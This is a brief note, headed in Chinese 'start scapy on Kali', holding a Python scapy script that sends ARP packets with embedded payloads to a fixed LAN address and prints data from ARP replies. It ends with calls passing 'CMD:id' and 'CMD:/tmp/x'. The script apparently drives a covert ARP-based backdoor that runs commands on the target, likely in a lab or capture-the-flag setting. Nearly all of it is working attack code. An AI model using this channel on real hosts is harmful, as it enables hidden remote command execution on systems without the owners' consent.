kali上开启scapy

```python
from scapy.all import *

target_ip = "192.168.39.13"
iface = "eth0"

def q(payload, timeout=2):
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=target_ip) / Raw(load=payload)

    sniffer = AsyncSniffer(iface=iface, filter="arp", store=True)
    sniffer.start()

    import time
    time.sleep(0.1)
    sendp(pkt, iface=iface, verbose=0)
    time.sleep(timeout)

    pkts = sniffer.stop()

    for p in pkts:
        if ARP not in p:
            continue
        if p[ARP].op != 2:
            continue

        data = None
        if Raw in p:
            data = bytes(p[Raw].load)
        elif Padding in p:
            data = bytes(p[Padding].load)

        if data:
            print(data)
            
            
>>> q(b"CMD:id")
>>> q(b"CMD:/tmp/x")
```
